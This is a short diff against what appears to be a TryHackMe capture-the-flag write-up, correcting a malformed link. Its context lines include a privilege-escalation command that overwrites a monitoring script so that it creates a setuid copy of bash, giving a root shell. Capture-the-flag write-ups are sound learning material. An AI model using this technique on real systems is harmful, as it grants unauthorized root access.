@@ -1164,7 +1164,7 @@ devops@tryhackme-2404:~$
 
 And there we have the final flag!
 
-An alternate approach if we what a shell is to create a [SUID]((https://en.wikipedia.org/wiki/Setuid)) bash in our home directory.
+An alternate approach if we what a shell is to create a [SUID](https://en.wikipedia.org/wiki/Setuid) bash in our home directory.
 
 ```bash
 devops@tryhackme-2404:~$ echo -e '#!/bin/bash\ncp /bin/bash /home/devops/cajac\nchmod +xs /home/devops/cajac' > /opt/monitoring/health_report.sh
